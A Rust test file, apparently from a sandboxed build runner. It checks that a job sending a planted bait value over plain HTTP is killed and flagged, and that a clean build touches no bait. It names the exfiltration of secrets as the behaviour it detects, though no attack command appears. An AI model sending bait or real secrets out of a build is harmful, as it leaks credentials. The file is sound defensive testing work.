/// TC-024-4 (HB-023): a bait value in an unencrypted HTTP body stops the job.
#[test]
fn bait_value_in_plain_http_is_detected() {
    let Some(b) = one("bait_value_in_plain_http_is_detected") else {
        return;
    };
    let out = run_spec(&b, "baitpost", &[], limits(), NetworkMode::Internet, true);
    eprintln!("{} {:?}", text(&out.stdout), out.report.events);
    assert_eq!(out.status, JobStatus::Killed, "the job must be stopped");
    assert!(out.report.bait_touched(), "{:?}", out.report.events);
}

/// TC-024-5 (HB-024): a clean build touches no bait (no false positive).
#[test]
fn clean_build_touches_no_bait() {
    let Some(b) = one("clean_build_touches_no_bait") else {
        return;
    };
    let out = run_spec(&b, "cleanbuild", &[], limits(), NetworkMode::Internet, true);
    eprintln!("{}\n{}", text(&out.stdout), text(&out.stderr));
    assert_eq!(out.status, JobStatus::Exited(0), "{}", text(&out.stderr));
    assert!(
        !out.report.bait_touched(),
        "a clean build touched bait: {:?}",
        out.report.events
    );
}
